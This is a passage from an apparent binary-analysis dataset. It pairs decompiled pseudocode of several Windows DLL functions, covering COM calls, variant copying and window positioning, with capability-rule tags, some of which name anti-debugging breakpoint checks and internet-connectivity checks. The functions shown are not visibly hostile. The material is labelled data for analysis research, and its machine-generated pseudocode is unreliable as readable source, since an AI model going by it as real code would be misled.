0xfffffffffffffffe;\n    uStack56 = *0x180067ce0 ^ auStack344;\n    uStack72 = CONCAT44(*0x18005180c, *0x180051808);\n    uStack64 = CONCAT44(*0x180051814, *0x180051810);\n    uVar14 = 0;\n    cStack248 = '\\0';\n    puStack200 = arg2;\n    piStack168 = arg1;\n    puStack144 = arg2;\n    if (arg2 != NULL) {\n        piStack224 = NULL;\n        iVar10 = (***arg2)(uStack72, arg2, 0x1800514d8);\n        if (iVar10 < 0) {\n            if (piStack224 != NULL) {\n                (**(*piStack224 + 0x10))();\n            }\n        }\n        else {\n            uStack208 = 0;\n            if (arg1[5] == 0) {\n                piStack216 = NULL;\n                iVar10 = (***arg2)(arg2, 0x1800514b8, &piStack216);\n                if (iVar10 < 0) {\n                    if (piStack216 != NULL) {\n                        (**(*piStack216 + 0x10))();\n                    }\n                    if (piStack224 != NULL) {\n                        (**(*piStack224 + 0x10))();\n                    }\n                    goto code_r0x0001800236f7;\n                }\n                iVar10 = (**(*piStack216 + 0x18))(piStack216, arg1 + 3, arg1 + 5, arg1 + 6);\n                if (iVar10 < 0) {\n                    if (piStack216 != NULL) {\n                        (**(*piStack216 + 0x10))();\n                    }\n                    if (piStack224 != NULL) {\n                        (**(*piStack224 + 0x10))();\n                    }\n                    goto code_r0x0001800236f7;\n                }\n                *(arg1 + 7) = 0;\n                if (piStack216 != NULL) {\n                    (**(*piStack216 + 0x10))();\n                }\n            }\n            else {\n                *(arg1 + 7) = 1;\n            }\n            piStack216 = NULL;\n            uVar12 = SUB168(ZEXT816(0x58) * ZEXT816(arg1[3]), 0);\n            if (SUB168(ZEXT816(0x58) * ZEXT816(arg1[3]) >> 0x40, 0) != 0) {\n                uVar12 = 0xffffffffffffffff;\n            }\n            arg1_00 = fcn.180009660(uVar12);\n            piStack216 = arg1_00;\n            if (arg1_00 == NULL) {\n                if (piStack224 != NULL) {\n                    (**(*piStack224 + 0x10))();\n                }\n            }\n            else {\n                piStack152 = arg1_00;\n                iVar13 = fcn.180009660(arg1[3]);\n                arg1[4] = iVar13;\n                if (arg1[4] == 0) {\n                    fcn.1800096a4(arg1_00);\n                    if (piStack224 != NULL) {\n                        (**(*piStack224 + 0x10))();\n                    }\n                }\n                else {\n                    uStack232 = 0;\n                    uVar15 = uVar14;\n                    arg1_01 = uVar14;\n                    piStack192 = arg1_00;\n                    while (piVar17 = piStack192,  uVar15 < arg1[3]) {\n                        *(uVar15 + arg1[4]) = 0;\n                        puStack240 = uVar15 * 0x50;\n                        iVar13 = arg1[5];\n                        puVar1 = puStack240 + iVar13 + 0x20;\n                        if ((*puVar1 < arg1[8] || *puVar1 == arg1[8]) || (*(puStack240 + iVar13 + 0x28) == 0xd)) {\n                            if (*(puStack240 + iVar13 + 0x28) == 0xd) {\n                                puStack240 = NULL;\n                                puStack184 = fcn.180009660(0x14);\n                                if (puStack184 == NULL) {\n                                    uVar14 = uStack232;\n                                    puStack240 = puStack184;\n                                    if (uStack232 != 0) {\n                                        piVar17 = arg1_00 + 5;\n                                        do {\n                                            fcn.1800096a4(*piVar17);\n                                            piVar17 = piVar17 + 0xb;\n                                            uVar14 = uVar14 - 1;\n                                        } while (uVar14 != 0);\n                                    }\n                                    fcn.1800096a4(arg1[4]);\n                                    arg1[4] = 0;\n                                    fcn.1800096a4(arg1_00);\n                                    if (piStack224 != NULL) {\n                                        (**(*piStack224 + 0x10))();\n                                    }\n                                    goto code_r0x0001800236f7;\n                                }\n                                *puStack184 = 0;\n                                uVar9 = *0x180056150;\n                                uVar12 = *0x180056148;\n                                *(puStack184 + 1) = *0x180056148;\n                                *(puStack184 + 3) = uVar9;\n                                puStack240 = uStack232 * 0x50;\n                                *(puStack240 + arg1[5] + 0x28) = 0xd;\n                                *(puStack240 + arg1[5] + 0x20) = 8;\n                                iVar13 = arg1[5];\n                                uVar11 = fcn.18001dc74(uVar12);\n                                uStack288 = (uVar11 - 1) + arg1_01 & ~(uVar11 - 1);\n                                iVar7 = *(puStack240 + iVar13 + 0x20);\n                                uStack280 = iVar7 + 7 + uStack288 & 0xfffffffffffffff8;\n                                iStack272 = uStack280 + 8;\n                                arg1_01 = uStack280 + 0xc;\n                                puStack264 = puStack184;\n                                uStack296 = 0;\n                                uStack304 = *(puStack240 + iVar13 + 0x2b);\n                                uStack312 = uStack312 & 0xffffffffffffff00 | *(puStack240 + iVar13 + 0x2a);\n                                uStack208 = arg1_01;\n                                uStack160 = uStack288;\n                                fcn.18001f3dc(piVar17, *(puStack240 + iVar13 + 0x10), *(puStack240 + iVar13 + 0x28), \n                                              iVar7);\n                                uVar15 = uStack160;\n                            }\n                            else {\n                                if (*(puStack240 + iVar13 + 0x28) == 0x81) {\n                                    piVar3 = puStack240 + iVar13 + 0x20;\n                                    *piVar3 = *piVar3 + 1;\n                                }\n                                iVar13 = arg1[5];\n                                if (*(puStack240 + iVar13 + 0x28) == 0x82) {\n                                    *(puStack240 + iVar13 + 0x20) = *(puStack240 + iVar13 + 0x20) * 2 + 2;\n                                }\n                                iVar13 = arg1[5];\n                                uVar11 = fcn.18001dc74();\n                                uStack288 = (uVar11 - 1) + arg1_01 & ~(uVar11 - 1);\n                                iVar7 = *(puStack240 + iVar13 + 0x20);\n                                uStack280 = iVar7 + 7 + uStack288 & 0xfffffffffffffff8;\n                                iStack272 = uStack280 + 8;\n                                arg1_01 = uStack280 + 0xc;\n                                puStack264 = NULL;\n                                uStack296 = 0;\n                                uStack304 = *(puStack240 + iVar13 + 0x2b);\n                                uStack312 = uStack312 & 0xffffffffffffff00 | *(puStack240 + iVar13 + 0x2a);\n                                uStack208 = arg1_01;\n                                uStack160 = uStack288;\n                                fcn.18001f3dc(piVar17, *(puStack240 + iVar13 + 0x10), *(puStack240 + iVar13 + 0x28), \n                                              iVar7);\n                                uVar15 = uStack160;\n                            }\n                        }\n                        else if (*(arg1 + 0x3c) == 2) {\n                            uVar16 = arg1_01 + 7 & 0xfffffffffffffff8;\n                            arg1_01 = uVar16 + 0xc;\n                            *(puStack240 + iVar13 + 0x20) = 0;\n                            iVar13 = arg1[5];\n                            uVar4 = *(puStack240 + iVar13 + 0x2b);\n                            uVar5 = *(puStack240 + iVar13 + 0x2a);\n                            puStack184 = *(puStack240 + iVar13 + 0x20);\n                            uStack246 = *(puStack240 + iVar13 + 0x28);\n                            iVar13 = *(puStack240 + iVar13 + 0x10);\n                            uStack208 = arg1_01;\n                            if (piStack192 == NULL) {\n                                fcn.180001214(0x80004005);\n                                pcVar8 = swi(3);\n                                (*pcVar8)();\n                                return;\n                            }\n                            *(piStack192 + 0x3c) = 0;\n                            piStack192[5] = 0;\n                            *(piStack192 + 8) = 0;\n                            *piStack192 = iVar13;\n                            *(piStack192 + 0x54) = uStack246;\n                            *(piStack192 + 0x56) = uVar5;\n                            *(piStack192 + 0x57) = uVar4;\n                            *(piStack192 + 10) = 0;\n                            piStack192[1] = 0;\n                            piStack192[2] = 0;\n                            piStack192[3] = 0;\n                            piStack192[4] = 0;\n                            piStack192[6] = 0;\n                            piStack192[9] = puStack184;\n                            *(piStack192 + 7) = 0;\n                            if (uVar16 != 0) {\n                                *(piStack192 + 7) = 2;\n                                piStack192[2] = uVar16;\n                            }\n                            uVar15 = uVar14;\n                            if (uVar16 + 8 != 0) {\n                                *(piStack192 + 7) = *(piStack192 + 7) | 4;\n                                piStack192[3] = uVar16 + 8;\n                            }\n                        }\n                        else if (*(arg1 + 0x3c) == 1) {\n                            puVar2 = puStack240 + iVar13 + 0x28;\n                            *puVar2 = *puVar2 | 0x4000;\n                            *(puStack240 + arg1[5] + 0x20) = 8;\n                            *(uVar15 + arg1[4]) = 1;\n                            iVar13 = arg1[5];\n                            uStack176 = *(puStack240 + iVar13 + 0x28);\n                            uVar11 = fcn.18001dc74();\n                            uVar15 = (uVar11 - 1) + arg1_01 & ~(uVar11 - 1);\n                            iVar7 = *(puStack240 + iVar13 + 0x20);\n                            uVar16 = iVar7 + 7 + uVar15 & 0xfffffffffffffff8;\n                            arg1_01 = uVar16 + 0xc;\n                            uVar4 = *(puStack240 + iVar13 + 0x2b);\n                            uVar6 = *(puStack240 + iVar13 + 0x2a);\n                            uStack246 = uStack246 & 0xff00 | uVar6;\n                            iVar13 = *(puStack240 + iVar13 + 0x10);\n                            uStack208 = arg1_01;\n                            if (piVar17 == NULL) {\n                                fcn.180001214(0x80004005);\n                                pcVar8 = swi(3);\n                                (*pcVar8)();\n                                return;\n                            }\n                            *(piVar17 + 0x3c) = 0;\n                            piVar17[5] = 0;\n                            *(piVar17 + 8) = 0;\n                            *piVar17 = iVar13;\n                            *(piVar17 + 0x54) = uStack176;\n                            *(piVar17 + 0x56) = uVar6;\n                            *(piVar17 + 0x57) = uVar4;\n                            *(piVar17 + 10) = 0;\n                            piVar17[2] = 0;\n                            piVar17[3] = 0;\n                            piVar17[4] = 0;\n                            piVar17[6] = 0;\n                            piVar17[9] = iVar7;\n                            *(piVar17 + 7) = 1;\n                            piVar17[1] = uVar15;\n                            if (uVar16 != 0) {\n                                *(piVar17 + 7) = 3;\n                                piVar17[2] = uVar16;\n                            }\n                            if (uVar16 + 8 != 0) {\n                                *(piVar17 + 7) = *(piVar17 + 7) | 4;\n                                piVar17[3] = uVar16 + 8;\n                            }\n                        }\n                        else {\n                            if (cStack248 == '\\0') {\n                                uStack128 = 0x89;\n                                uStack124 = 0x8b;\n                                iStack136 = 0;\n                                iStack132 = 0;\n                                uStack312 = CONCAT44(uStack312._4_4_, 2);\n                                fcn.180022a54(arg1, arg2, &uStack128, &iStack136);\n                                if (iStack136 == 0) {\n                                    if (iStack132 != 0) {\n                                        uStack72 = CONCAT44(*0x1800517fc, *0x1800517f8);\n                                        uStack64 = CONCAT44(*0x180051804, *0x180051800);\n                                    }\n                                }\n                                else {\n                                    uStack72 = CONCAT44(*0x18005180c, *0x180051808);\n                                    uStack64 = CONCAT44(*0x180051814, *0x180051810);\n                                }\n                                cStack248 = '\\x01';\n                            }\n                            puStack240 = NULL;\n                            puStack184 = fcn.180009660(0x14);\n                            if (puStack184 == NULL) {\n                                uVar14 = uStack232;\n                                puStack240 = puStack184;\n                                if (uStack232 != 0) {\n                                    piVar17 = arg1_00 + 5;\n                                    do {\n                                        fcn.1800096a4(*piVar17);\n                                        piVar17 = piVar17 + 0xb;\n                                        uVar14 = uVar14 - 1;\n                                    } while (uVar14 != 0);\n                                }\n                                fcn.1800096a4(arg1[4]);\n                                arg1[4] = 0;\n                                fcn.1800096a4(arg1_00);\n                                if (piStack224 != NULL) {\n                                    (**(*piStack224 + 0x10))();\n                                }\n                                goto code_r0x0001800236f7;\n                            }\n                            *puStack184 = 0;\n                            *(puStack184 + 1) = uStack72;\n                            *(puStack184 + 3) = uStack64;\n                            puStack240 = uStack232 * 0x50;\n                            *(puStack240 + arg1[5] + 0x28) = 0xd;\n                            *(puStack240 + arg1[5] + 0x20) = 8;\n                            iVar13 = arg1[5];\n                            uVar11 = fcn.18001dc74(uStack72);\n                            uStack288 = (uVar11 - 1) + arg1_01 & ~(uVar11 - 1);\n                            iVar7 = *(puStack240 + iVar13 + 0x20);\n                            uStack280 = iVar7 + 7 + uStack288 & 0xfffffffffffffff8;\n                            iStack272 = uStack280 + 8;\n                            arg1_01 = uStack280 + 0xc;\n                            puStack264 = puStack184;\n                            uStack296 = 0;\n                            uStack304 = *(puStack240 + iVar13 + 0x2b);\n                            uStack312 = uStack312 & 0xffffffffffffff00 | *(puStack240 + iVar13 + 0x2a);\n                            uStack208 = arg1_01;\n                            uStack160 = uStack288;\n                            fcn.18001f3dc(piVar17, *(puStack240 + iVar13 + 0x10), *(puStack240 + iVar13 + 0x28), iVar7);\n                            uVar15 = uStack160;\n                        }\n                        piStack192 = piVar17 + 0xb;\n                        *(puStack240 + arg1[5] + 8) = uVar15;\n                        uStack232 = uStack232 + 1;\n                        arg2 = puStack200;\n                        uVar15 = uStack232;\n                    }\n                    if (*arg1 == 0) {\n                        iVar10 = fcn.18001db80(arg1, 1);\n                        if (iVar10 < 0) {\n                            if (arg1[3] != 0) {\n                                piVar17 = arg1_00 + 5;\n                                do {\n                                    fcn.1800096a4(*piVar17);\n                                    uVar14 = uVar14 + 1;\n                                    piVar17 = piVar17 + 0xb;\n                                } while (uVar14 < arg1[3]);\n                            }\n                            fcn.1800096a4(arg1[4]);\n                            arg1[4] = 0;\n                            fcn.1800096a4(arg1_00);\n                            if (piStack224 != NULL) {\n                                (**(*piStack224 + 0x10))();\n                            }\n                            goto code_r0x0001800236f7;\n                        }\n                        *(*arg1 + 8) = 1;\n                    }\n                    arg1[2] = 0;\n                    iVar13 = fcn.180009660(arg1_01);\n                    arg1[2] = iVar13;\n                    if (arg1[2] == 0) {\n                        if (arg1[3] != 0) {\n                            piVar17 = arg1_00 + 5;\n                            do {\n                                fcn.1800096a4(*piVar17);\n                                uVar14 = uVar14 + 1;\n                                piVar17 = piVar17 + 0xb;\n                            } while (uVar14 < arg1[3]);\n                        }\n                        fcn.1800096a4(arg1[4]);\n                        arg1[4] = 0;\n                        fcn.1800096a4(arg1_00);\n                        if (piStack224 != NULL) {\n                            (**(*piStack224 + 0x10))();\n                        }\n                    }\n                    else {\n                        fcn.180033c90(arg1[2], 0, arg1_01);\n                        uStack312 = piStack224;\n                        iVar10 = fcn.18001dbec(arg1_00, arg1[3], *arg1, arg1_01);\n                        if (iVar10 < 0) {\n                            fcn.1800096a4(arg1[4]);\n                            arg1[4] = 0;\n                        }\n                        fcn.1800096a4(arg1_00);\n                        if (piStack224 != NULL) {\n                            (**(*piStack224 + 0x10))();\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0001800236f7:\n    fcn.180032ea0(uStack56 ^ auStack344);\n    return;\n}\n",
        "token_count": 4841
    },
    "180024a5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.180024a58(int64_t arg1)\n\n{\n    ulong *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    ulong arg1_00;\n    int64_t iVar7;\n    bool bVar8;\n    int64_t *piStackX8;\n    int64_t *piStackX16;\n    uint32_t uStack56;\n    uint32_t uStack52;\n    int32_t iStack48;\n    int32_t iStack40;\n    int32_t iStack36;\n    int32_t iStack32;\n    int32_t iStack28;\n    \n    if (*(arg1 + 8) == 0) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        uVar5 = (*pcVar2)();\n        return uVar5;\n    }\n    iVar6 = *(*(arg1 + 8) + 0x50);\n    if (iVar6 == 0) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        uVar5 = (*pcVar2)();\n        return uVar5;\n    }\n    iVar6 = fcn.180019674(iVar6);\n    if (iVar6 == 0) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        uVar5 = (*pcVar2)();\n        return uVar5;\n    }\n    iVar3 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar6 + 0x40));\n    bVar8 = iVar3 == 0;\n    if (bVar8) {\n        arg1_00 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        iVar7 = fcn.180017c38(arg1_00);\n        (*_sym.imp.USER32.dll_GetWindowRect)(*(iVar7 + 0x40), &iStack40);\n        (*_sym.imp.USER32.dll_GetWindowRect)(*(iVar6 + 0x40));\n        fcn.18001be30(iVar6, (iStack32 - iStack40) / 2, (iStack28 - iStack36) / 2, 0);\n        fcn.18001be78(iVar6, 1);\n    }\n    puVar1 = *(*(arg1 + 8) + 0x80);\n    iVar3 = (***puVar1)(puVar1, 0x1800512d0, arg1 + 0x90);\n    if (iVar3 < 0) {\n        puVar1 = *(*(arg1 + 8) + 0x80);\n        uVar5 = (***puVar1)(puVar1, 0x180051330, &piStackX8);\n        if (uVar5 < 0) {\n            return uVar5;\n        }\n        (**(*piStackX8 + 0x28))(piStackX8, &piStackX16);\n        (**(*piStackX8 + 0x10))();\n        if (piStackX16 == NULL) {\n            return 0x80004005;\n        }\n        uVar4 = (***piStackX16)(piStackX16, 0x180056058, arg1 + 0x10);\n        (**(*piStackX16 + 0x10))();\n        if (uVar4 < 0) {\n            return uVar4;\n        }\n        (****(arg1 + 0x10))();\n    }\n    else {\n        uVar4 = (**(**(arg1 + 0x90) + 0x18))();\n        if (*(arg1 + 0x98) == 0) {\n            uVar4 = 0x80004003;\n        }\n        if (uVar4 < 0) {\n            if (bVar8) {\n                fcn.18001be30(iVar6, uStack56, uStack52, iStack48 - uStack56);\n                fcn.18001be78(iVar6, 0);\n            }\n            return uVar4;\n        }\n    }\n    uVar4 = fcn.180023724(arg1);\n    if (bVar8) {\n        fcn.18001be30(iVar6, uStack56, uStack52, iStack48 - uStack56);\n        fcn.18001be78(iVar6, 0);\n    }\n    return uVar4;\n}\n",
        "token_count": 984
    },
    "18002583": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.18002583c(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t arg1_00;\n    code *pcVar3;\n    char cVar4;\n    ulong uVar5;\n    int64_t iVar6;\n    ulong *puVar7;\n    uint64_t arg2_00;\n    ulong *puVar8;\n    uint64_t *puVar9;\n    uchar auStack616 [32];\n    uint32_t uStack584;\n    uint32_t uStack576;\n    uint32_t uStack568;\n    int32_t iStack552;\n    uint16_t auStack548 [2];\n    uchar auStack544 [24];\n    uint16_t uStack520;\n    uint16_t uStack518;\n    uint16_t uStack516;\n    int16_t iStack512;\n    uint16_t uStack510;\n    uint16_t uStack508;\n    int16_t iStack504;\n    uint16_t uStack502;\n    uint16_t uStack500;\n    uint16_t uStack498;\n    uint16_t uStack496;\n    uint16_t uStack494;\n    int64_t iStack488;\n    ulong uStack480;\n    uint uStack472;\n    ulong uStack464;\n    uint uStack456;\n    int64_t iStack448;\n    ushort auStack440 [4];\n    ulong uStack432;\n    ushort auStack416 [4];\n    ulong uStack408;\n    ushort auStack392 [4];\n    uint uStack384;\n    ushort auStack368 [4];\n    double dStack360;\n    ushort auStack344 [4];\n    uchar uStack336;\n    ushort auStack320 [4];\n    ulong uStack312;\n    ushort auStack296 [4];\n    ulong uStack288;\n    ushort auStack272 [4];\n    ulong uStack264;\n    ushort auStack248 [4];\n    ulong uStack240;\n    ulong uStack224;\n    ulong auStack216 [2];\n    uchar auStack200 [24];\n    uchar auStack176 [24];\n    uchar auStack152 [24];\n    uchar auStack128 [24];\n    uchar auStack104 [24];\n    uchar auStack80 [24];\n    uchar uStack56;\n    char cStack55;\n    char cStack54;\n    int64_t iStack53;\n    uint64_t uStack32;\n    \n    uStack224 = 0xfffffffffffffffe;\n    uStack32 = *0x180067ce0 ^ auStack616;\n    arg2_00 = arg3;\n    puVar7 = NULL;\n    iStack552 = 0;\n    if (*(arg1 + 0x90) == 0) {\n        fcn.180012514();\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    if (*(arg1 + 0xa8) == 0) {\n        fcn.180012514();\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    fcn.18001d3b4(auStack544);\n    iStack552 = 3;\n    fcn.180021bb4(*(arg1 + 0xa8), arg2_00, &iStack552);\n    if (iStack552 == 3) {\n        fcn.18001d734(arg2, auStack544);\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack544);\n        goto code_r0x000180026334;\n    }\n    arg1_00 = *(arg1 + 0xa8);\n    cVar4 = fcn.18001f480(arg1_00, arg2_00, auStack548);\n    if (cVar4 == '\\0') {\n        fcn.18001d734(arg2, auStack544);\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack544);\n        goto code_r0x000180026334;\n    }\n    if (auStack548[0] < 0x82) {\n        if (auStack548[0] == 0x81) {\n            if (*(arg1_00 + 0x38) == '\\0') {\n                iVar6 = *(arg1_00 + 0x28);\n                if (arg2_00 <= *(arg1_00 + 0x18) + -1 + *(iVar6 + 0x10)) {\n                    puVar8 = arg2_00 - *(iVar6 + 0x10);\ncode_r0x000180025f34:\n                    puVar7 = *(iVar6 + 8 + puVar8 * 0x50) + *(arg1_00 + 0x10);\n                }\n            }\n            else if (*(arg1_00 + 0x18) != 0) {\n                iVar6 = *(arg1_00 + 0x28);\n                puVar9 = iVar6 + 0x10;\n                puVar8 = puVar7;\n                do {\n                    if (*puVar9 == arg2_00) goto code_r0x000180025f34;\n                    puVar8 = puVar8 + 1;\n                    puVar9 = puVar9 + 10;\n                } while (puVar8 < *(arg1_00 + 0x18));\n            }\n            puVar7 = fcn.180024c9c(&iStack488, puVar7);\n            uVar5 = fcn.18001daf0(auStack80, *puVar7);\n            fcn.18001d390(auStack544, uVar5);\n            (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack80);\n            LOCK();\n            piVar1 = iStack488 + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar2 + -1 < 1) {\n                (**(**(iStack488 + -0x18) + 8))();\n            }\n        }\n        else if (auStack548[0] < 9) {\n            if (auStack548[0] == 8) goto code_r0x000180026257;\n            if (auStack548[0] == 2) {\ncode_r0x000180025cb7:\n                if ((*(arg1_00 + 0x38) != '\\0') && (*(arg1_00 + 0x18) != 0)) {\n                    puVar9 = *(arg1_00 + 0x28) + 0x10;\n                    do {\n                        if (*puVar9 == arg2_00) break;\n                        puVar7 = puVar7 + 1;\n                        puVar9 = puVar9 + 10;\n                    } while (puVar7 < *(arg1_00 + 0x18));\n                }\n                uVar5 = fcn.18001d2c8(auStack200);\n                fcn.18001d390(auStack544, uVar5);\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack200);\n            }\n            else if (auStack548[0] == 3) {\ncode_r0x000180025c29:\n                if (*(arg1_00 + 0x38) == '\\0') {\n                    iVar6 = *(arg1_00 + 0x28);\n                    if (arg2_00 <= *(arg1_00 + 0x18) + -1 + *(iVar6 + 0x10)) {\n                        puVar8 = arg2_00 - *(iVar6 + 0x10);\ncode_r0x000180025c70:\n                        puVar7 = *(iVar6 + 8 + puVar8 * 0x50) + *(arg1_00 + 0x10);\n                    }\n                }\n                else if (*(arg1_00 + 0x18) != 0) {\n                    iVar6 = *(arg1_00 + 0x28);\n                    puVar9 = iVar6 + 0x10;\n                    puVar8 = puVar7;\n                    do {\n                        if (*puVar9 == arg2_00) goto code_r0x000180025c70;\n                        puVar8 = puVar8 + 1;\n                        puVar9 = puVar9 + 10;\n                    } while (puVar8 < *(arg1_00 + 0x18));\n                }\n                uVar5 = fcn.18001d2f8(auStack152, *puVar7);\n                fcn.18001d390(auStack544, uVar5);\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack152);\n            }\n            else if (auStack548[0] == 4) {\n                if (*(arg1_00 + 0x38) == '\\0') {\n                    iVar6 = *(arg1_00 + 0x28);\n                    if (arg2_00 <= *(arg1_00 + 0x18) + -1 + *(iVar6 + 0x10)) {\n                        puVar8 = arg2_00 - *(iVar6 + 0x10);\ncode_r0x000180025b9d:\n                        puVar7 = *(iVar6 + 8 + puVar8 * 0x50) + *(arg1_00 + 0x10);\n                    }\n                }\n                else if (*(arg1_00 + 0x18) != 0) {\n                    iVar6 = *(arg1_00 + 0x28);\n                    puVar9 = iVar6 + 0x10;\n                    puVar8 = puVar7;\n                    do {\n                        if (*puVar9 == arg2_00) goto code_r0x000180025b9d;\n                        puVar8 = puVar8 + 1;\n                        puVar9 = puVar9 + 10;\n                    } while (puVar8 < *(arg1_00 + 0x18));\n                }\n                uStack384 = *puVar7;\n                auStack392[0] = 4;\n                fcn.18001d390(auStack544, auStack392);\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack392);\n            }\n            else if (auStack548[0] == 5) {\n                if (*(arg1_00 + 0x38) == '\\0') {\n                    iVar6 = *(arg1_00 + 0x28);\n                    if (arg2_00 <= *(arg1_00 + 0x18) + -1 + *(iVar6 + 0x10)) {\n                        puVar8 = arg2_00 - *(iVar6 + 0x10);\ncode_r0x000180025b06:\n                        puVar7 = *(iVar6 + 8 + puVar8 * 0x50) + *(arg1_00 + 0x10);\n                    }\n                }\n                else if (*(arg1_00 + 0x18) != 0) {\n                    iVar6 = *(arg1_00 + 0x28);\n                    puVar9 = iVar6 + 0x10;\n                    puVar8 = puVar7;\n                    do {\n                        if (*puVar9 == arg2_00) goto code_r0x000180025b06;\n                        puVar8 = puVar8 + 1;\n                        puVar9 = puVar9 + 10;\n                    } while (puVar8 < *(arg1_00 + 0x18));\n                }\n                uStack312 = *puVar7;\n                auStack320[0] = 5;\n                fcn.18001d390(auStack544, auStack320);\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack320);\n            }\n            else if (auStack548[0] == 6) {\n                if (*(arg1_00 + 0x38) == '\\0') {\n                    iVar6 = *(arg1_00 + 0x28);\n                    if (arg2_00 <= *(arg1_00 + 0x18) + -1 + *(iVar6 + 0x10)) {\n                        puVar8 = arg2_00 - *(iVar6 + 0x10);\ncode_r0x000180025a71:\n                        puVar7 = *(iVar6 + 8 + puVar8 * 0x50) + *(arg1_00 + 0x10);\n                    }\n                }\n                else if (*(arg1_00 + 0x18) != 0) {\n                    iVar6 = *(arg1_00 + 0x28);\n                    puVar9 = iVar6 + 0x10;\n                    puVar8 = puVar7;\n                    do {\n                        if (*puVar9 == arg2_00) goto code_r0x000180025a71;\n                        puVar8 = puVar8 + 1;\n                        puVar9 = puVar9 + 10;\n                    } while (puVar8 < *(arg1_00 + 0x18));\n                }\n                uStack264 = *puVar7;\n                auStack272[0] = 6;\n                fcn.18001d390(auStack544, auStack272);\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack272);\n            }\n            else if (auStack548[0] == 7) {\n                if (*(arg1_00 + 0x38) == '\\0') {\n                    iVar6 = *(arg1_00 + 0x28);\n                    if (arg2_00 <= *(arg1_00 + 0x18) + -1 + *(iVar6 + 0x10)) {\n                        puVar8 = arg2_00 - *(iVar6 + 0x10);\ncode_r0x0001800259da:\n                        puVar7 = *(iVar6 + 8 + puVar8 * 0x50) + *(arg1_00 + 0x10);\n                    }\n                }\n                else if (*(arg1_00 + 0x18) != 0) {\n                    iVar6 = *(arg1_00 + 0x28);\n                    puVar9 = iVar6 + 0x10;\n                    puVar8 = puVar7;\n                    do {\n                        if (*puVar9 == arg2_00) goto code_r0x0001800259da;\n                        puVar8 = puVar8 + 1;\n                        puVar9 = puVar9 + 10;\n                    } while (puVar8 < *(arg1_00 + 0x18));\n                }\n                uStack432 = *puVar7;\n                auStack440[0] = 7;\n                fcn.18001d390(auStack544, auStack440);\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack440);\n            }\n        }\n        else if (auStack548[0] == 0xb) {\n            if ((*(arg1_00 + 0x38) != '\\0') && (*(arg1_00 + 0x18) != 0)) {\n                puVar9 = *(arg1_00 + 0x28) + 0x10;\n                do {\n                    if (*puVar9 == arg2_00) break;\n                    puVar7 = puVar7 + 1;\n                    puVar9 = puVar9 + 10;\n                } while (puVar7 < *(arg1_00 + 0x18));\n            }\n            uVar5 = fcn.18001d2c8(auStack128);\n            fcn.18001d390(auStack544, uVar5);\n            (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack128);\n        }\n        else if (auStack548[0] == 0xc) {\n            if (*(arg1_00 + 0x38) == '\\0') {\n                iVar6 = *(arg1_00 + 0x28);\n                if (arg2_00 <= *(arg1_00 + 0x18) + -1 + *(iVar6 + 0x10)) {\n                    puVar8 = arg2_00 - *(iVar6 + 0x10);\ncode_r0x000180025e1c:\n                    puVar7 = *(iVar6 + 8 + puVar8 * 0x50) + *(arg1_00 + 0x10);\n                }\n            }\n            else if (*(arg1_00 + 0x18) != 0) {\n                iVar6 = *(arg1_00 + 0x28);\n                puVar9 = iVar6 + 0x10;\n                puVar8 = puVar7;\n                do {\n                    if (*puVar9 == arg2_00) goto code_r0x000180025e1c;\n                    puVar8 = puVar8 + 1;\n                    puVar9 = puVar9 + 10;\n                } while (puVar8 < *(arg1_00 + 0x18));\n            }\n            uVar5 = fcn.18001d734(auStack176, puVar7);\n            fcn.18001d390(auStack544, uVar5);\n            (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack176);\n        }\n        else if (0xf < auStack548[0]) {\n            if (auStack548[0] < 0x12) {\n                if (*(arg1_00 + 0x38) == '\\0') {\n                    iVar6 = *(arg1_00 + 0x28);\n                    if (arg2_00 <= *(arg1_00 + 0x18) + -1 + *(iVar6 + 0x10)) {\n                        puVar8 = arg2_00 - *(iVar6 + 0x10);\ncode_r0x000180025d8d:\n                        puVar7 = *(iVar6 + 8 + puVar8 * 0x50) + *(arg1_00 + 0x10);\n                    }\n                }\n                else if (*(arg1_00 + 0x18) != 0) {\n                    iVar6 = *(arg1_00 + 0x28);\n                    puVar9 = iVar6 + 0x10;\n                    puVar8 = puVar7;\n                    do {\n                        if (*puVar9 == arg2_00) goto code_r0x000180025d8d;\n                        puVar8 = puVar8 + 1;\n                        puVar9 = puVar9 + 10;\n                    } while (puVar8 < *(arg1_00 + 0x18));\n                }\n                uStack336 = *puVar7;\n                auStack344[0] = 0x11;\n                fcn.18001d390(auStack544, auStack344);\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack344);\n            }\n            else {\n                if (auStack548[0] == 0x12) goto code_r0x000180025cb7;\n                if (auStack548[0] == 0x13) goto code_r0x000180025c29;\n            }\n        }\n    }\n    else if 